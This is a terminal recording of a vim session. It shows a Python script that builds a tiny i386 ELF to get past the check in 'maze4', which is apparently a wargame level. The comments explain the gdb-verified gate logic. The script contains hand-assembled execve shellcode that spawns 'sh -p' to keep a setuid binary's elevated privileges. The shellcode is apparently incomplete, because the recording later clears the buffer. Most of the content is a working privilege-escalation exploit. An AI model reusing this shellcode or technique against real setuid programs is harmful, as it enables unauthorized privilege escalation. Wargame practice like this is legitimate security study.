[0.001, "o", "\u001b[2;1H▽\u001b[6n\u001b[2;1H  \u001b[3;1H\u001bPzz\u001b\\\u001b[0%m\u001b[6n\u001b[3;1H           \u001b[1;1H\u001b[>c\u001b]10;?\u0007\u001b]11;?\u0007"]
[0.012, "o", "\u001b[1;1H\u001b[34m# tinel.py - build a 123-byte i386 ELF that passes maze4's stat-then-exec gate.\r\r\n#\u001b[m\u001b[2;2H\u001b[K\u001b[3;1H\u001b[34m# maze4 gate (gdb-verified): read(52)->bufA, lseek to dword(bufA+28), read(32)->bufB,\u001b[m\u001b[3;86H\u001b[K\u001b[4;1H\u001b[34m#   pass iff dword(bufB+12) == bufA[7]*bufA[8] && st_size <= 123, then execv(argv[1]).\r\r\n# An ELF passes for free:\r\r\n#   bufA[7],bufA[8] = EI_OSABI,EI_ABIVERSION = 0,0\r\r\n#     -> product 0\r\r\n#   bufA+28..31    = e_phoff = 52\r\r\n#     -> the lseek offset\r\r\n#   bufB+12..15    = phdr.p_paddr (phdr offset 12)\r\r\n#     -> must be 0 (kernel ignores it)\r\r\n# Strings \"sh\\0-p\\0\" hide in e_ident[9..14] (EI_PAD); a dash copy sits in the cwd.\r\r\n# 26-byte stub at file offset 84: execve(\"sh\",{\"sh\",\"-p\",NULL},NULL) --\r\r\n# maze4 is setuid maze5, and dash -p keeps the elevated euid.\u001b[m\r\r\n\u001b[35mimport\u001b[m struct, sys\r\r\nV = \u001b[31m0x08048000\u001b[m\r\r\nCODE_OFF = \u001b[31m84\u001b[m\r\r\ncode = \u001b[36mbytes\u001b[m([\u001b[31m0x31\u001b[m, \u001b[31m0xC0\u001b[m,\u001b[13C\u001b[34m# xor eax, eax\u001b[m\r\r\n    \u001b[31m0x50\u001b[m,\u001b[30C\u001b[34m# push eax  (envp NULL)\u001b[m\r\r\n    \u001b[31m0x68\u001b[m, \u001b[31m0x0C\u001b[m, \u001b[31m0x80\u001b[m, \u001b[31m0x04\u001b[m, \u001b[31m0x08\u001b[m,     \u001b[34m# push \"-p\" @ V+12\u001b[m\r\r\n    \u001b[31m0x68\u001b[m, \u001b[31m0x09\u001b[m, \u001b[31m0x80\u001b[m, \u001b[31m0x04\u001b[m, \u001b[31m0x08\u001b[m,     \u001b[34m# push \"sh\" @ V+9\u001b[m\r\r\n    \u001b[31m0x89\u001b[m, \u001b[31m0xE1\u001b[m,\u001b[24C\u001b[34m# mov ecx, esp  (argv)\u001b[m\r\r\n    \u001b[31m0xBB\u001b[m, \u001b[31m0x09\u001b[m, \u001b[31m0x80\u001b[m, \u001b[31m0x04\u001b[m, \u001b[31m0x08\u001b[m,     \u001b[34m# mov ebx, \"sh\" path\u001b[m\r\r\n    \u001b[31m0x31\u001b[m, \u001b[31m0xD2\u001b[m,\u001b[24C\u001b[34m# xor edx, edx  (envp NULL)\u001b[m\r\r\n    \u001b[31m0xB0\u001b[m, \u001b[31m0x0B\u001b[m,\u001b[24C\u001b[34m# mov al, 11    (__NR_execve)\u001b[m\r\r\n    \u001b[31m0xCD\u001b[m, \u001b[31m0x80\u001b[m,\u001b[24C\u001b[34m# int 0x80\u001b[m\r\r\n])\r\r\n\u001b[33massert\u001b[m \u001b[36mlen\u001b[m(code) == \u001b[31m26\u001b[m\r\r\nehdr = \u001b[36mbytearray\u001b[m(\u001b[31m52\u001b[m)\r\r\nehdr[\u001b[31m0\u001b[m:\u001b[31m8\u001b[m] = \u001b[31mb\"\u001b[m\u001b[35m\\x7f\u001b[m\u001b[31mELF\u001b[m\u001b[35m\\x01\\x01\\x01\\x00\u001b[m\u001b[31m\"\u001b[m\r\r\nehdr[\u001b[31m9\u001b[m:\u001b[31m15\u001b[m] = \u001b[31mb\"sh\u001b[m\u001b[35m\\x00\u001b[m\u001b[31m-p\u001b[m\u001b[35m\\x00\u001b[m\u001b[31m\"\u001b[m\r\r\nehdr[\u001b[31m15\u001b[m] = \u001b[31m0\u001b[m\r\r\nstruct.pack_into(\u001b[31m\"<HHIIIIIHHHHHH\"\u001b[m, ehdr, \u001b[31m16\u001b[m,\u001b[34;83H1,1\u001b[11CTop\u001b[1;1H\u001b[?25h\u001b[?4m"]
[3.402, "o", "\u001b[?25l\u001b[34;73H^[\u001b[1;1H\u001b[34;73H  \u001b[1;1H\u001b[34;73H^[\u001b[1;1H\u0007\u001b[34;73H  \u001b[1;1H\u001b[?25h\u001b[?25l\u001b[34;1H\u001b[K\u001b[34;1H:set noai nocin nosi indentexpr= formatoptions=\r\u001b[82C1,1\u001b[11CTop\u001b[1;1H\u001b[?25h\u001b[?25l\u001b[34;73HdG\u001b[1;1H\u001b[34;73H  \u001b[1;1H\u001b[1;1H\u001b[K\u001b[2;1H\u001b[1m\u001b[34m~                                                                                                   \u001b[3;1H~                                                                                                   \u001b[4;1H~                                                                                                   \u001b[5;1H~                                                                                                   \u001b[6;1H~                                                                                                   \u001b[7;1H~                                                                                                   \u001b[8;1H~                                                                                                   \u001b[9;1H~                                                                                                   \u001b[10;1H~                                                                                                   \u001b[11;1H~                                                                                                   \u001b[12;1H~                                                                                                   \u001b[13;1H~                                                                                                   \u001b[14;1H~                                                                                                   \u001b[15;1H~                                                                                                   \u001b[16;1H~                                                                                                   \u001b[17;1H~                                                                                                   \u001b[18;1H~                                                                                                   \u001b[19;1H~                                                                                                   \u001b[20;1H~                                                                                                   \u001b[21;1H~                                                                                                   \u001b[22;1H~                                                                                                   \u001b[23;1H~                                                                                                   \u001b[24;1H~                                                                                                   \u001b[25;1H~                                                                                                   \u001b[26;1H~                                                                                                   \u001b[27;1H~                                                                                                   \u001b[28;1H~                                                                                                   \u001b[29;1H~                                                                                                   \u001b[30;1H~                                                                                                   \u001b[31;1H~                                                                                                   \u001b[32;1H~                                                                                                   \u001b[33;1H~                                                                                                   \u001b[m\u001b[34;1H--No lines in buffer--\u001b[34;23H\u001b[K\u001b[34;83H0,0-1\u001b[9CAll\u001b[1;1H\u001b[?25h\u001b[?25l\u001b[34;73Hi\u001b[1;1H\u001b[34;73H \u001b[1;1H\u001b[34;1H\u001b[1m-- INSERT --\u001b[m\u001b[34;13H\u001b[K\u001b[34;83H0,1\u001b[11CAll\u001b[1;1H\u001b[?25h"]
